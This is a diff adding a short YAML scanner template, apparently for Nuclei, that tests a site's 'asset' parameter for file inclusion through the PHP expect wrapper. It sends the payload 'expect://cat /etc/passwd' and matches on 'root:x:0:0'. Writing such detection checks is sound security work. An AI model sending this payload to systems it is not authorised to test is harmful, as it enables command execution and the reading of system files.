@@ -1,0 +1,20 @@
+id: lfi5-090
+name: 'Wrapper expect via asset'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via expect wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      asset:
+        - 'expect://cat /etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
